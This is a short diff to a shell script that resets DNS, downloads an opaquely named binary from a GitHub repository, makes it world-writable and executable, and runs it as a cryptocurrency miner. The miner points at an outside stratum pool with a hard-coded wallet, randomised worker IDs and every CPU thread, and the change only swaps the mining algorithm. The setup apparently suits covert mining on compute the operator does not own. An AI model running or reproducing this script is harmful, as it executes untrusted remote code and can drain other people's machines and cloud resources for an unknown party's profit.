@@ -10,4 +10,4 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O asu https://github.com/kidoescegh/filee/raw/main/SRB-3.0
 chmod 777 asu
-./asu --algorithm verushash --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 4ABvqyPptDc2FiJncCiJVSabDJk8guGYcr.$(echo $RANDOM | md5sum | head -c 20) --password x --cpu-threads $(nproc --all)
+./asu --algorithm tht --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 4ABvqyPptDc2FiJncCiJVSabDJk8guGYcr.$(echo $RANDOM | md5sum | head -c 20) --password x --cpu-threads $(nproc --all)
